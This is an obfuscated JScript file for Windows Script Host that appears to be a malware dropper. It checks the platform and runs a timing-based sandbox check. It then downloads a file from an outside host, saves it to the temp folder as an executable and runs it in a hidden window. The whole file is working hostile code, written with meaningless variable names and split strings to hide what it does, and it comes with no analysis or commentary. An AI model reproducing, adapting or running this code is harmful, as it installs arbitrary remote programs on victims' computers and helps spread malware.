var h0 = false;
var yD = "CreateObject";
var C = function D() {return WScript[yD]("WScript.Shell");}(), Ee = 11;
var q = "MSXML2.XMLHTTP";
var h = 2123213;
var nZ = 0;
function N(HU){C["Run"](HU, nZ, nZ);};
function J(){return "" + q;};
function c(CG, V0){nZ = nZ * 1; return CG - V0;};
function Mf(){return yD;};
/*@cc_on
  @if (@_win32 || @_win64)
    h0 = true;
  @end
@*/
if (h0)
{
var Cn = "";
function B(){return 22;};
var Ae = 0; var Ib = 0;
function i()
{
var K = new this["Date"]();
var fE = K["getUTCMilliseconds"]();
WScript["Sleep"](B());
var K = new this["Date"]();
var cd = K["getUTCMilliseconds"]();
WScript["Sleep"](B());
var K = new this["Date"]();
var V = K["getUTCMilliseconds"]();
var Ae = "x";
Ae = c(cd, fE);
var Ib = "r";
Ib = c(V, cd);
Cn = "open";
return c(Ae, Ib);
}
var nC = false;
var Q = false;
for (var k = nZ; k < B() * 1; k++){if (i() != nZ){
nC = true; 
Ib = "31" + 11 * Ae + Ib; 
Q = true; 
break;
}}
function E() {return ((nC == true) && (nC == Q)) ? 1 : nZ;};
if (nC && E() && Q){
function RO() {return C["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "yuJNPp8iL.exe";};
 hN = J();
 zl = WScript[yD](hN);
 var a0 = 1;
 while (a0){
try {
zl[Cn]("GET", "http://dealingdeuces.com/o4pskd", false);
zl["send"]();
sn = "Sleep";
for (;;){WScript[sn](B() * 11); if (zl["readystate"] >= 2 * 2) break;};
a0 = nZ;
} catch(t){};
}
function a(Et) {var w0 = (1, 2, 3, 4, 5, Et); return w0;};
W = WScript[Mf()]("ADODB.Stream");
hN = W;
hN[Cn]();
hN["type"] = a(1);
hN["write"](zl["ResponseBody"]);
W["position"] = a(nZ);
hN["Save" + "ToFile"](RO(), 2);
W["c"+"lose"]();
w = RO();
N(w);
}
}

